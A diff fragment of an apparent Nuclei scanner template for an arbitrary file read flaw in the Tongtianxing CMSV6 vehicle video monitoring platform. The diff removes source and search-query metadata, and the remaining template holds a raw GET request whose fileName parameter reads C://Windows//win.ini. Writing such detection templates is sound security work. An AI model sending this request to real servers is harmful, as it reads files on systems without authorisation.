@@ -3,12 +3,8 @@ info:
   name: 通天星CMSV6车载视频监控平台Logger接口任意文件读取漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/dynb4pzki8gdrnae'
+  description: ''
   tags: lfi,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: dynb4pzki8gdrnae
-    fofa: ZoomEye语法:app:"通天星 CMSV6"
 http:
 - raw:
   - 'GET /808gps/logger/downloadLogger.action?fileName=C://Windows//win.ini HTTP/1.1
